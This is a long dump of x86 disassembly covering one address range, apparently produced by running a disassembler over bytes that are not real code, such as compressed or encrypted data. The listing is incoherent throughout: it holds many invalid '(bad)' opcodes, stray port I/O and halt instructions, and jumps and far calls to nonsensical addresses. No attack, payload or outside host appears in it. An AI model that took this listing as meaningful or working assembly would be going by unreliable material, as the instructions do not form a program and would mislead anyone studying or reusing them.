  4223a8:	add    al,al
  4223aa:	sub    eax,0x231c0f98
  4223af:	cmp    dl,BYTE PTR ds:0xdf48f85e
  4223b5:	jmp    0x422367
  4223b7:	repnz hlt 
  4223b9:	cmc    
  4223ba:	jns    0x42234a
  4223bc:	lods   eax,DWORD PTR ds:[esi]
  4223bd:	pop    esi
  4223be:	test   BYTE PTR [ebx+ecx*2+0x36053f41],0x3f
  4223c6:	push   cs
  4223c7:	test   al,0xc6
  4223c9:	in     al,dx
  4223ca:	or     al,0x23
  4223cc:	push   ebx
  4223cd:	jmp    0xba83:0x41a93424
  4223d4:	dec    esi
  4223d5:	jbe    0x4223f6
  4223d7:	mov    esp,0xfa9a0087
  4223dc:	shl    ah,0x3c
  4223df:	add    ebp,esi
  4223e1:	jg     0x422406
  4223e3:	js     0x4223a7
  4223e5:	fcomp  DWORD PTR [edx+ebx*2+0x41]
  4223e9:	adc    ah,BYTE PTR [ebp+0x18]
  4223ec:	add    al,0xeb
  4223ee:	rol    BYTE PTR [ebx-0x6400b8cd],0x2c
  4223f5:	ins    DWORD PTR es:[edi],dx
  4223f6:	jmp    0x2d59be1e
  4223fb:	je     0x4223fc
  4223fd:	pusha  
  4223fe:	shl    DWORD PTR [eax-0x759e4029],0x89
  422405:	dec    ecx
  422406:	jbe    0x4223d9
  422408:	daa    
  422409:	nop
  42240a:	frstor [esi+0x7e]
  42240d:	daa    
  42240e:	je     0x4223ee
  422410:	jns    0x42248e
  422412:	std    
  422413:	pop    esi
  422414:	test   BYTE PTR [edi],bl
  422416:	(bad)  
  422417:	adc    DWORD PTR [eax+ebx*2+0x164ff4ba],edx
  42241e:	rcr    DWORD PTR [ebx-0x73338bb3],0x5
  422425:	lods   eax,DWORD PTR ds:[esi]
  422426:	or     bh,ah
  422428:	out    0x2b,eax
  42242a:	ds popf 
  42242c:	pop    edx
  42242d:	mov    al,0xb8
  42242f:	push   0xffffffc3
  422431:	mov    BYTE PTR [ebp+0x3693cc3a],al
  422437:	int3   
  422438:	test   BYTE PTR [eax-0x35],al
  42243b:	mov    ah,BYTE PTR [ecx+0x20]
  42243e:	pop    eax
  42243f:	retf   
  422440:	loope  0x4224b5
  422442:	or     al,0x9c
  422444:	fxch   st(4)
  422446:	adc    edi,DWORD PTR [esi-0x7cb0ac99]
  42244c:	imul   ebp,DWORD PTR [ecx],0x1c
  42244f:	push   ebp
  422450:	sub    ebx,DWORD PTR [edx+ebx*1]
  422453:	popf   
  422454:	addr16 nop
  422456:	jmp    0x3aac02cc
  42245b:	dec    edi
  42245c:	pop    esi
  42245d:	jbe    0x422493
  42245f:	push   cs
  422460:	aad    0xc4
  422462:	and    edi,esp
  422464:	imul   ecx,ebp,0xffffff92
  422467:	adc    al,cl
  422469:	ins    DWORD PTR es:[edi],dx
  42246a:	psubb  mm3,mm6
  42246d:	inc    edx
  42246e:	jne    0x422445
  422470:	xor    eax,0x6e128f02
  422475:	fisubr DWORD PTR [edx+0x27]
  422478:	and    ebp,DWORD PTR [eax]
  42247a:	stc    
  42247b:	jne    0x422419
  42247d:	dec    edx
  42247e:	xlat   BYTE PTR ds:[ebx]
  42247f:	pop    ss
  422480:	add    ebp,ecx
  422482:	and    al,0xa9
  422484:	(bad)  
  422485:	int3   
  422486:	xchg   esi,eax
  422487:	xchg   ebp,eax
  422488:	fimul  DWORD PTR ds:0x4e32115d
  42248e:	mov    ss,WORD PTR ds:0xe3a32b8d
  422494:	pop    edx
  422495:	(bad)  
  422496:	es int3 
  422498:	add    BYTE PTR [ecx-0x6b],bl
  42249b:	fist   WORD PTR [esp+ebx*4+0x880286e]
  4224a2:	cld    
  4224a3:	ss cmp al,0x4f
  4224a6:	inc    ebp
  4224a7:	adc    cl,bl
  4224a9:	hlt    
  4224aa:	nop
  4224ab:	ds ret 
  4224ad:	xchg   BYTE PTR ds:0x36ffde20,cl
  4224b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224b4:	(bad)  
  4224b5:	mov    ds:0xf73fc3bc,al
  4224ba:	enter  0x298f,0x9d
  4224be:	(bad)  
  4224bf:	push   edx
  4224c0:	not    BYTE PTR [ebp+0x4a]
  4224c3:	dec    ecx
  4224c4:	in     eax,dx
  4224c5:	cmp    al,al
  4224c7:	sahf   
  4224c8:	pop    eax
  4224c9:	jle    0x422527
  4224cb:	pop    esp
  4224cc:	mov    eax,0x6fcec21
  4224d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4224d2:	cmp    BYTE PTR [ebp-0x16],dh
  4224d5:	jl     0x422479
  4224d7:	xlat   BYTE PTR ds:[ebx]
  4224d8:	sub    eax,0x728c1d70
  4224dd:	jae    0x422469
  4224df:	cmp    ebx,DWORD PTR [eax+0x7a]
  4224e2:	sar    DWORD PTR [edx],1
  4224e4:	sub    BYTE PTR [edi+0x63962180],al
  4224ea:	(bad)  
  4224eb:	hlt    
  4224ec:	sub    al,0xc1
  4224ee:	(bad)  
  4224ef:	push   esp
  4224f0:	in     al,0x87
  4224f2:	fiadd  WORD PTR [ebx]
  4224f4:	xor    eax,0x2a1bb54a
  4224f9:	pop    esi
  4224fa:	cwde   
  4224fb:	pop    es
  4224fc:	shl    ch,1
  4224fe:	mov    bh,0x58
  422500:	ds test edx,eax
  422503:	dec    eax
  422504:	inc    edx
  422505:	imul   edi,esp,0x42
  422508:	imul   edi,eax,0x22
  42250b:	push   ss
  42250c:	sahf   
  42250d:	adc    ebx,DWORD PTR [ebp-0x44]
  422510:	xor    al,cl
  422512:	imul   ebp,DWORD PTR [ecx],0x5a
  422515:	hlt    
  422516:	adc    eax,esi
  422518:	mov    ah,0x17
  42251a:	in     al,dx
  42251b:	imul   eax,DWORD PTR [esi],0xfb41412d
  422521:	adc    ecx,eax
  422523:	pop    eax
  422524:	fcom   DWORD PTR [ecx+0x3124bd47]
  42252a:	pop    esi
  42252b:	mov    WORD PTR [ebx],fs
  42252d:	ins    BYTE PTR es:[edi],dx
  42252e:	call   0x4db4:0x1c351ee3
  422535:	mov    al,0xb8
  422537:	jae    0x4224e5
  422539:	add    eax,0xe6d5d9e
  42253e:	out    dx,eax
  42253f:	fimul  DWORD PTR [ecx+0x387b98a3]
  422545:	inc    esp
  422546:	lahf   
  422547:	pushw  ds
  422549:	stc    
  42254a:	sar    DWORD PTR [eax+0x4d],cl
  42254d:	fcom   DWORD PTR [eax]
  42254f:	(bad)  
  422550:	pop    ss
  422551:	int    0xfb
  422553:	mov    cl,0x13
  422555:	cmp    edx,esp
  422557:	jecxz  0x4225c8
  422559:	test   BYTE PTR [esi-0x15],al
  42255c:	adc    DWORD PTR [edx-0x77],eax
  42255f:	jecxz  0x42259c
  422561:	lods   al,BYTE PTR ds:[esi]
  422562:	gs sbb al,0x95
  422565:	lods   eax,DWORD PTR ds:[esi]
  422566:	pop    edi
  422567:	mov    esp,0x43b26fe4
  42256c:	inc    ebp
  42256d:	inc    eax
  42256e:	rol    BYTE PTR [eax+0x3a],1
  422571:	out    dx,eax
  422572:	inc    edi
  422573:	pop    esi
  422574:	xor    bh,BYTE PTR [eax-0x4991159a]
  42257a:	ret    0x64d2
  42257d:	or     eax,0x3615f3e8
  422582:	in     eax,0xb
  422584:	call   0xca64ff0f
  422589:	pop    esp
  42258a:	add    eax,0x63d1813f
  42258f:	sub    bh,BYTE PTR [ebx-0x1d]
  422592:	push   ss
  422593:	pusha  
  422594:	mov    ah,0x59
  422596:	mov    bh,0xbd
  422598:	xchg   ebp,eax
  422599:	loopne 0x422545
  42259b:	imul   eax,ecx,0xffffffbe
  42259e:	adc    BYTE PTR [esi+0x5c0b668d],cl
  4225a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4225a5:	enter  0xd26c,0x79
  4225a9:	xor    ah,bh
  4225ab:	xchg   ebp,eax
  4225ac:	mov    eax,ds:0x98483395
  4225b1:	aas    
  4225b2:	ds mov ebx,0xe5077fb6
  4225b8:	outs   dx,DWORD PTR ds:[esi]
  4225b9:	loop   0x422541
  4225bb:	hlt    
  4225bc:	push   ss
  4225bd:	push   ss
  4225be:	imul   ebx,DWORD PTR [eax+ebx*1-0x6096990a],0x9fe737e0
  4225c9:	call   0x306d:0xfb252f79
  4225d0:	jae    0x422602
  4225d2:	ret    0x85e3
  4225d5:	and    dl,bh
  4225d7:	cdq    
  4225d8:	mov    esi,0x57441960
  4225dd:	arpl   WORD PTR [eax+0x71],cx
  4225e0:	add    dh,ah
  4225e2:	mov    edx,0x10be484
  4225e7:	test   eax,0xb7e1fd8d
  4225ec:	add    BYTE PTR [eax+0x24],dl
  4225ef:	mov    ebp,0xf8247720
  4225f4:	or     eax,0xde11c629
  4225f9:	inc    edx
  4225fa:	adc    ch,BYTE PTR [ecx-0x5c]
  4225fd:	les    edx,FWORD PTR [eax+0x2423bb3e]
  422603:	inc    ecx
  422604:	icebp  
  422605:	fmul   DWORD PTR [ecx+0x65]
  422608:	aad    0xd1
  42260a:	add    DWORD PTR [ebp-0x4141e3e],eax
  422610:	mul    BYTE PTR [ebp+0x3b]
  422613:	xchg   esp,eax
  422614:	popf   
  422615:	pop    eax
  422616:	gs ins DWORD PTR es:[edi],dx
  422618:	push   eax
  422619:	add    BYTE PTR [eax],al
  42261b:	add    BYTE PTR [esi-0x4fd6421],dh
  422621:	inc    esi
  422622:	mov    edi,0x5e25f0ff
  422627:	and    eax,0x94a76e62
  42262c:	cmc    
  42262d:	mov    al,ds:0x2850001
  422632:	add    BYTE PTR [eax],al
  422634:	icebp  
  422635:	push   ebp
  422636:	jb     0x422652
  422638:	(bad)  
  422639:	mov    eax,ds:0x3e8b2c12
  42263e:	pop    ebx
  42263f:	xchg   edx,eax
  422640:	xchg   BYTE PTR fs:[eax+0xd],ch
  422644:	mov    ecx,0x2e0fa2df
  422649:	jnp    0x4225e4
  42264b:	and    eax,esi
  42264d:	ror    BYTE PTR [eax-0x2d],cl
  422650:	jno    0x42267d
  422652:	mov    ebp,0x1b005597
  422657:	xchg   BYTE PTR [edx-0x1f557b28],bh
  42265d:	ror    BYTE PTR [ecx],0xc3
  422660:	out    0x90,al
  422662:	add    DWORD PTR [ecx+0x74],ecx
  422665:	mov    cl,0xba
  422667:	fwait
  422668:	push   es
  422669:	mov    esp,0x9319bc1f
  42266e:	xchg   eax,edx
  422670:	jmp    0x2fac:0x64ddd564
  422677:	repnz or BYTE PTR [ebx-0x76509c13],cl
  42267e:	xchg   ebp,eax
  42267f:	lds    edx,FWORD PTR [edi+0xd]
  422682:	or     eax,0x8b0443ca
  422687:	(bad)  
  422688:	mul    BYTE PTR [eax-0x2e]
  42268b:	es lahf 
  42268d:	xor    al,BYTE PTR [ebp+0x3571b494]
  422693:	lea    eax,[esi+0x1a]
  422696:	mov    edx,0x7ac5a8c2
  42269b:	ficomp DWORD PTR [ebx+0x7f]
  42269e:	mov    ecx,0xa0521ff4
  4226a3:	aad    0xdf
  4226a5:	adc    DWORD PTR [ebx+0x293156cf],esp
  4226ab:	or     esp,DWORD PTR [eax-0x2a8ccca3]
  4226b1:	ja     0x42266f
  4226b3:	outs   dx,BYTE PTR ds:[esi]
  4226b4:	adc    al,0x74
  4226b6:	mov    edx,0x72a6fb5c
  4226bb:	stos   BYTE PTR es:[edi],al
  4226bc:	dec    esi
  4226bd:	(bad)  
  4226be:	(bad)  
  4226bf:	lods   eax,DWORD PTR ds:[esi]
  4226c0:	(bad)  
  4226c2:	lock call 0x52a6:0x9b3482cd
  4226ca:	sbb    DWORD PTR [esi+0x461af8a9],edx
  4226d0:	fstp   TBYTE PTR [edx+edx*1]
  4226d3:	vpunpckhwd xmm6,xmm6,xmm6
  4226d7:	pop    eax
  4226d8:	pushf  
  4226d9:	arpl   WORD PTR [ebp+0x1a644428],dx
  4226df:	fisttp QWORD PTR [ecx+0x231f5552]
  4226e5:	xor    ah,BYTE PTR [ecx]
  4226e7:	fs push edi
  4226e9:	mov    bh,BYTE PTR [ecx-0x7126c9bf]
  4226ef:	mov    ebx,0x67b9d05e
  4226f4:	popf   
  4226f5:	idiv   bh
  4226f7:	jbe    0x4226e2
  4226f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226fa:	sbb    BYTE PTR [ecx+edx*8-0x3e],0x76
  4226ff:	stos   DWORD PTR es:[edi],eax
  422700:	sub    ebx,DWORD PTR [edx]
  422702:	or     ah,BYTE PTR [edx+esi*4-0x4]
  422706:	jecxz  0x422700
  422708:	jns    0x4226ba
  42270a:	pop    ebp
  42270b:	rcr    DWORD PTR [edx+0x6c],0x48
  42270f:	pop    esi
  422710:	(bad)  
  422711:	in     al,dx
  422712:	inc    ebp
  422713:	aas    
  422714:	sbb    al,0x3c
  422716:	push   esp
  422717:	xchg   ebp,eax
  422718:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422719:	dec    edi
  42271a:	xor    BYTE PTR [ebx+0x2c4e63c1],0x9e
  422721:	and    eax,ebp
  422723:	cmp    BYTE PTR [ebx+edx*2-0x47],al
  422727:	pop    edx
  422728:	(bad)  
  422729:	dec    esi
  42272a:	dec    ebp
  42272b:	jb     0x4226ae
  42272d:	jb     0x422769
  42272f:	push   ecx
  422730:	loope  0x4227a6
  422732:	cmp    al,0x7d
  422734:	pop    esp
  422735:	imul   esi,DWORD PTR [esi+0x7821e614],0x431f490
  42273f:	pop    ebp
  422740:	ror    DWORD PTR [esi+0x264d5ecf],0x7b
  422747:	shr    esp,1
  422749:	sbb    eax,0x226d81d2
  42274e:	sbb    BYTE PTR ds:0xc7b22167,bh
  422754:	cwde   
  422755:	icebp  
  422756:	clc    
  422757:	dec    ebp
  422758:	shr    BYTE PTR [esi],1
  42275a:	jle    0x42271e
  42275c:	mov    cl,0xf6
  42275e:	imul   ecx,DWORD PTR [ecx-0x53edfcb9],0x69
  422765:	pop    es
  422766:	and    al,0xf2
  422768:	(bad)  
  422769:	pusha  
  42276a:	xor    al,0xb9
  42276c:	ja     0x422787
  42276e:	jl     0x422706
  422770:	aaa    
  422771:	(bad)  
  422772:	pusha  
  422773:	sbb    DWORD PTR [eax+eax*1],ebx
  422776:	jecxz  0x4227b7
  422778:	lea    ecx,[edx-0x48065b73]
  42277e:	jg     0x4227cd
  422780:	out    dx,al
  422781:	std    
  422782:	inc    edx
  422783:	or     BYTE PTR [ecx+0x3a],bh
  422786:	mov    edi,0xb3f3a262
  42278b:	mov    al,0x2a
  42278d:	mov    esi,0x68516039
  422792:	push   0xadfe6308
  422797:	lods   eax,DWORD PTR ds:[esi]
  422798:	scas   al,BYTE PTR es:[edi]
  422799:	out    0x3d,eax
  42279b:	adc    eax,0x20dea80d
  4227a0:	inc    esi
  4227a1:	js     0x42276d
  4227a3:	pop    ebp
  4227a4:	sbb    al,0xe2
  4227a6:	stos   DWORD PTR es:[edi],eax
  4227a7:	jge    0x4227bc
  4227a9:	jp     0x4227b7
  4227ab:	icebp  
  4227ac:	jg     0x422812
  4227ae:	jmp    0x4227cc
  4227b0:	das    
  4227b1:	dec    ebx
  4227b2:	and    DWORD PTR [ebp+0x66ff92d0],edx
  4227b8:	stc    
  4227b9:	dec    edi
  4227ba:	sub    ebx,DWORD PTR [ecx]
  4227bc:	pop    esp
  4227bd:	mov    bl,0xc8
  4227bf:	int3   
  4227c0:	add    BYTE PTR [ecx-0xcccdb5d],ch
  4227c6:	inc    ebp
  4227c7:	aad    0x6b
  4227c9:	mov    esi,0x6eaf533
  4227ce:	sbb    al,0xad
  4227d0:	xor    eax,0xed18f4ad
  4227d5:	lods   eax,DWORD PTR ds:[esi]
  4227d6:	mov    al,0xa
  4227d8:	push   esp
  4227d9:	or     dl,dh
  4227db:	mov    eax,0x30038496
  4227e0:	sub    DWORD PTR ds:0xc11745d7,ebp
  4227e6:	and    edx,DWORD PTR [edx+0x3b]
  4227e9:	sbb    al,0xd9
  4227eb:	sahf   
  4227ec:	jle    0x4227f7
  4227ee:	dec    ecx
  4227ef:	add    esi,esp
  4227f1:	popf   
  4227f2:	(bad)  
  4227f3:	(bad)  
  4227f4:	adc    ch,BYTE PTR ds:0x70d24b3b
  4227fa:	jne    0x4227be
  4227fc:	push   ecx
  4227fd:	in     eax,dx
  4227fe:	dec    edi
  4227ff:	int3   
  422800:	stos   BYTE PTR es:[edi],al
  422801:	sbb    DWORD PTR [edi-0x6e2705ce],ebx
  422807:	dec    ecx
  422808:	cmp    edx,DWORD PTR [edi-0x69]
  42280b:	fwait
  42280c:	cmp    ecx,esi
  42280e:	das    
  42280f:	cmpxchg BYTE PTR [ebx+0x75],ah
  422813:	jno    0x42288e
  422815:	push   ebp
  422816:	cmp    ah,BYTE PTR [ebp-0x6b1cb26e]
  42281c:	aam    0x12
  42281e:	out    dx,eax
  42281f:	scas   al,BYTE PTR es:[edi]
  422820:	mov    ds:0x66bbc0e3,eax
  422825:	call   0x8edf:0x227ecae8
  42282c:	mov    bl,0x9f
  42282e:	fnsave [ecx]
  422830:	cmp    eax,0xcb10e521
  422835:	jmp    FWORD PTR [esi-0x403886f0]
  42283b:	mov    eax,ds:0xd59efff8
  422840:	adc    eax,0xed0ed9ce
  422845:	bndldx (bad),[ecx]
  422848:	addr16 (bad) 
  42284a:	jmp    0x42285c
  42284c:	xchg   ebp,eax
  42284d:	mov    eax,0x12db6342
  422852:	xchg   edx,eax
  422853:	sub    BYTE PTR [ecx+0x5aeca463],bl
  422859:	jae    0x4228a8
  42285b:	cmp    ax,WORD PTR [ebp-0x70]
  42285f:	dec    edi
  422860:	add    ebx,ebx
  422862:	xor    al,0xba
  422864:	out    0x20,al
  422866:	sub    eax,0x72d74dce
  42286b:	enter  0x81e0,0x9b
  42286f:	(bad)  
  422870:	mov    eax,0x5251df53
  422875:	fldenv [esi]
  422877:	cmp    dl,al
  422879:	icebp  
  42287a:	mov    ecx,0xa922dc08
  42287f:	jecxz  0x422861
  422881:	mov    cl,dh
  422883:	mov    cl,0x6
  422885:	sub    esp,ecx
  422887:	dec    esp
  422888:	call   0x34f4:0xb171cd8b
  42288f:	jmp    0xcf44963e
  422894:	or     eax,0x1dac1525
  422899:	mov    edx,0x8de3615
  42289e:	fstp   QWORD PTR [esi+0x23]
  4228a1:	inc    edi
  4228a2:	loop   0x42287b
  4228a4:	or     DWORD PTR [esi],0xffffff90
  4228a7:	mov    eax,DWORD PTR [eax]
  4228a9:	xor    edi,DWORD PTR [edx-0xc6cec66]
  4228af:	lock push 0x79
  4228b2:	fist   WORD PTR [ebp+0x5c]
  4228b5:	or     al,0x54
  4228b7:	ret    
  4228b8:	das    
  4228b9:	add    BYTE PTR [eax],al
  4228bb:	add    al,bh
  4228bd:	mov    ah,0x7f
  4228bf:	cmp    eax,0xf5faff7f
  4228c4:	jle    0x4228c8
  4228c6:	xor    eax,DWORD PTR [esi-0x4c]
  4228c9:	fsubrp st(0),st
  4228cb:	and    al,0x7a
  4228cd:	mov    ds:0x2850001,eax
  4228d2:	add    BYTE PTR [eax],al
  4228d4:	(bad)  
  4228d5:	daa    
  4228d6:	xor    al,BYTE PTR [eax]
  4228d8:	sti    
  4228d9:	je     0x4228bd
  4228db:	sahf   
  4228dc:	pop    eax
  4228dd:	push   esp
  4228de:	mov    cl,BYTE PTR [edx]
  4228e0:	cmp    BYTE PTR [ecx+0x3e],bl
  4228e3:	out    dx,al
  4228e4:	retf   
  4228e5:	mov    ah,0xfa
  4228e7:	cmp    dl,0x23
  4228ea:	loope  0x422950
  4228ec:	aad    0xc6
  4228ee:	js     0x4228f4
  4228f0:	cli    
  4228f1:	nop
  4228f2:	lock jmp 0x19183ac6
  4228f8:	addr16 jl 0x422947
  4228fb:	sub    esi,DWORD PTR [esi+eax*1+0xa8a2c38]
  422902:	arpl   cx,bx
  422904:	test   DWORD PTR gs:[edx-0x34c05b8e],ebp
  42290b:	pop    ebx
  42290c:	data16 aam 0x6a
  42290f:	lods   eax,DWORD PTR es:[esi]
  422911:	ret    0x8a12
  422914:	cmp    BYTE PTR [edx+0x18],0x1a
  422918:	pop    ebx
  422919:	jl     0x42296e
  42291b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42291c:	jb     0x4228f5
  42291e:	js     0x422959
  422920:	inc    edi
  422921:	xchg   BYTE PTR [edi-0x38],dl
  422924:	mov    al,0x34
  422926:	outs   dx,BYTE PTR ds:[esi]
  422927:	xor    al,0xc1
  422929:	or     eax,0xfadc6b38
  42292e:	pop    ds
  42292f:	jecxz  0x42298c
  422931:	adc    al,0x1f
  422933:	hlt    
  422934:	cld    
  422935:	jmp    0x12c5c667
  42293a:	aam    0xdf
  42293c:	stc    
  42293d:	or     DWORD PTR [edi],eax
  42293f:	xor    al,0xf6
  422941:	ja     0x422907
  422943:	inc    esp
  422944:	adc    eax,0x26bd5401
  422949:	push   ecx
  42294a:	mov    ebx,0xa55a5548
  42294f:	or     eax,0xd4073850
  422954:	push   ds
  422955:	cwde   
  422956:	cwde   
  422957:	call   0xcc670e03
  42295c:	test   BYTE PTR [edi+ebp*2],0xc0
  422960:	sub    esp,DWORD PTR [edx-0x79]
  422963:	pop    eax
  422964:	test   al,0xbd
  422966:	and    eax,0x9aac22b
  42296b:	or     eax,ebp
  42296d:	repz jb 0x422974
  422970:	shl    BYTE PTR [esi],cl
  422972:	or     DWORD PTR ss:[ebp+0x4956fe7],eax
  422979:	mov    bh,0x9d
  42297b:	inc    ch
  42297d:	div    DWORD PTR [eax+0x33ea3d71]
  422983:	add    BYTE PTR [esp+eax*8-0xe],dl
  422987:	sti    
  422988:	xchg   esi,eax
  422989:	retf   
  42298a:	and    cl,BYTE PTR [esi-0x30]
  42298d:	dec    eax
  42298e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42298f:	fdivr  QWORD PTR [eax]
  422991:	rcr    DWORD PTR [eax+eiz*2],0x96
  422995:	clc    
  422996:	inc    esp
  422997:	jp     0x42294d
  422999:	push   edx
  42299a:	lds    esp,FWORD PTR [eax]
  42299c:	add    DWORD PTR [esi-0x495dc74e],eax
  4229a2:	call   0xc0d9:0x8c81ebe1
  4229a9:	dec    esi
  4229aa:	jns    0x4229f5
  4229ac:	adc    eax,0x3895d250
  4229b1:	inc    ecx
  4229b2:	cmp    DWORD PTR [esi],esi
  4229b4:	dec    esp
  4229b5:	mov    edx,0x32e7c153
  4229ba:	push   ecx
  4229bb:	add    edx,DWORD PTR [esp+ecx*4+0x2b]
  4229bf:	push   ebp
  4229c0:	fcomp  DWORD PTR [edi+ebp*2]
  4229c3:	and    al,0xa3
  4229c5:	in     al,dx
  4229c6:	out    dx,eax
  4229c7:	fnstenv [eax]
  4229c9:	imul   ecx,DWORD PTR [edx+0x17fb3ee5],0xffffffe9
  4229d0:	lahf   
  4229d1:	or     al,0x38
  4229d3:	mov    eax,ds:0xa17a986
  4229d8:	jbe    0x422978
  4229da:	imul   BYTE PTR [edx+0x3047a89c]
  4229e0:	hlt    
  4229e1:	shl    DWORD PTR [edi],cl
  4229e3:	and    al,0x8f
  4229e5:	pop    ebx
  4229e6:	jl     0x4229bc
  4229e8:	mov    ecx,0x60f61818
  4229ed:	cld    
  4229ee:	xchg   DWORD PTR [edx+0x59],esp
  4229f1:	xchg   ebx,eax
  4229f2:	jmp    0x859f6dc6
  4229f7:	mov    ch,0xd5
  4229f9:	cmp    al,0xe6
  4229fb:	pop    ecx
  4229fc:	gs jnp 0x4229f5
  4229ff:	xchg   DWORD PTR [ecx+ecx*8],ebx
  422a02:	add    ebx,DWORD PTR [edi+0x61dcee4e]
  422a08:	enter  0xa08,0x96
  422a0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a0d:	push   ebx
  422a0e:	shl    DWORD PTR [bx-0x5b],cl
  422a12:	es push edi
  422a14:	xor    eax,ecx
  422a16:	ins    DWORD PTR es:[edi],dx
  422a17:	clc    
  422a18:	cmp    ch,dh
  422a1a:	pop    edx
  422a1b:	fxch   st(4)
  422a1d:	jae    0x422a0d
  422a1f:	mov    WORD PTR ds:0x2845f1ac,fs
  422a25:	xchg   ecx,eax
  422a26:	mov    dh,0x76
  422a28:	pop    ecx
  422a29:	xor    BYTE PTR [edx+ebx*8-0x32e1d8de],cl
  422a30:	pop    ebp
  422a31:	stos   BYTE PTR es:[edi],al
  422a32:	iret   
  422a33:	xchg   ebp,eax
  422a34:	arpl   WORD PTR [esi-0x76],si
  422a37:	mov    al,ds:0x5ff6acd9
  422a3c:	(bad)  
  422a3d:	jp     0x422a4e
  422a3f:	xor    eax,DWORD PTR [edx+0x4014bf55]
  422a45:	pop    ebx
  422a46:	inc    ebx
  422a47:	xchg   BYTE PTR [ecx+0x9],bl
  422a4a:	jge    0x422a65
  422a4c:	das    
  422a4d:	rol    BYTE PTR [esi],0x9c
  422a50:	aam    0xa4
  422a52:	fwait
  422a53:	js     0x422ad4
  422a55:	sbb    al,0x82
  422a57:	bound  eax,QWORD PTR [esi+edx*1]
  422a5a:	pop    es
  422a5b:	pop    edi
  422a5c:	sub    al,0x51
  422a5e:	fs jle 0x422ad1
  422a61:	mov    DWORD PTR ds:[esi+esi*2-0x4f],esi
  422a66:	mov    al,0x20
  422a68:	sbb    ah,BYTE PTR [esi+edx*1]
  422a6b:	and    ebp,ebx
  422a6d:	push   0x32
  422a6f:	repnz pop edi
  422a71:	out    0x91,al
  422a73:	xor    BYTE PTR [ebx+0x1ae52b2c],dh
  422a79:	adc    BYTE PTR [eax+0x70],0x3b
  422a7d:	lahf   
  422a7e:	cmp    BYTE PTR [edx],dh
  422a80:	push   eax
  422a81:	mov    ecx,0xb8d5ebee
  422a86:	mov    ch,0xbe
  422a88:	sub    eax,0xbf5e5ad7
  422a8d:	call   0xfee0f5ae
  422a92:	ffreep st(4)
  422a94:	add    eax,0x674726d9
  422a99:	and    ebx,DWORD PTR [edi+0x6f]
  422a9c:	add    al,0x1
  422a9e:	dec    esi
  422a9f:	xchg   edi,eax
  422aa0:	call   0x994fcf56
  422aa5:	std    
  422aa6:	push   ss
  422aa7:	xchg   BYTE PTR [edx-0x52],bl
  422aaa:	add    al,0x6e
  422aac:	js     0x422a8c
  422aae:	ja     0x422ad3
  422ab0:	xor    bh,BYTE PTR [ecx-0x74300bb1]
  422ab6:	push   edi
  422ab7:	sub    bl,BYTE PTR [edi+0x5f67fa51]
  422abd:	xor    ch,0x1d
  422ac0:	mov    ah,0x18
  422ac2:	or     al,0x82
  422ac4:	cmc    
  422ac5:	xchg   ebx,eax
  422ac6:	fiadd  DWORD PTR [ebx-0x52bfe9ab]
  422acc:	mov    edx,0x88ea4f16
  422ad1:	into   
  422ad2:	mov    bh,0x4d
  422ad4:	mov    ds:0x6fe755ed,eax
  422ad9:	daa    
  422ada:	pop    edx
  422adb:	ret    0xd54f
  422ade:	iret   
  422adf:	xor    al,0x70
  422ae1:	dec    edx
  422ae2:	loopne 0x422aa9
  422ae4:	das    
  422ae5:	shr    DWORD PTR [ebx-0x2c],cl
  422ae8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ae9:	ins    BYTE PTR es:[edi],dx
  422aea:	xchg   BYTE PTR [edx+0x20],dh
  422aed:	test   DWORD PTR [ebp-0x759119cb],0x1f9d6bb7
  422af7:	popa   
  422af8:	fwait
  422af9:	lea    esp,[esi+0x1d62427b]
  422aff:	mov    dh,0x3c
  422b01:	ja     0x422b78
  422b03:	leave  
  422b04:	and    ax,0x4310
  422b08:	and    DWORD PTR [edx+0xd],ecx
  422b0b:	je     0x422a91
  422b0d:	inc    ebx
  422b0e:	jno    0x422b5b
  422b10:	sbb    ecx,DWORD PTR [ebp+0x38]
  422b13:	push   ds
  422b14:	mov    dl,0x5e
  422b16:	hlt    
  422b17:	test   al,0xb7
  422b19:	inc    ebp
  422b1a:	cld    
  422b1b:	mov    ebx,0x318a0d72
  422b20:	cld    
  422b21:	mov    al,ds:0x2ce96b59
  422b26:	scas   al,BYTE PTR es:[edi]
  422b27:	retf   
  422b28:	repnz mov ebx,0xa72ebdd2
  422b2e:	mov    eax,ds:0x895f1275
  422b33:	mov    eax,0x47749771
  422b38:	std    
  422b39:	daa    
  422b3a:	(bad)  
  422b3b:	adc    BYTE PTR [ebp+0x4843a153],dl
  422b41:	mov    eax,ds:0x21f3404
  422b46:	pop    ecx
  422b47:	push   ss
  422b48:	push   ebp
  422b49:	stos   DWORD PTR es:[edi],eax
  422b4a:	imul   esp,DWORD PTR [edx],0xffffffc2
  422b4d:	add    al,0x10
  422b4f:	jns    0x422bbe
  422b51:	add    bl,0x7f
  422b54:	inc    eax
  422b55:	sbb    eax,0x462cce
  422b5a:	add    BYTE PTR [eax],al
  422b5c:	cmp    DWORD PTR [ecx+ecx*4],ebx
  422b5f:	out    0xad,eax
  422b61:	idiv   DWORD PTR [edi-0x22]
  422b64:	mov    DWORD PTR [edx+0x79],ebp
  422b67:	xor    esi,0xff196b7d
  422b6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b6e:	add    DWORD PTR [eax],eax
  422b70:	test   DWORD PTR [edx],eax
  422b72:	add    BYTE PTR [eax],al
  422b74:	dec    BYTE PTR [edx-0x554635e2]
  422b7a:	stos   BYTE PTR es:[edi],al
  422b7b:	push   ebx
  422b7c:	xchg   DWORD PTR [edx],ecx
  422b7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b7f:	adc    ch,ch
  422b81:	lahf   
  422b82:	dec    DWORD PTR [ecx]
  422b84:	(bad)  
  422b85:	jl     0x422b17
  422b87:	(bad)  
  422b88:	fdivr  QWORD PTR [eax]
  422b8a:	loop   0x422b7a
  422b8c:	inc    ecx
  422b8d:	push   edi
  422b8e:	sbb    al,0x1b
  422b90:	cmp    ebp,DWORD PTR [ebx]
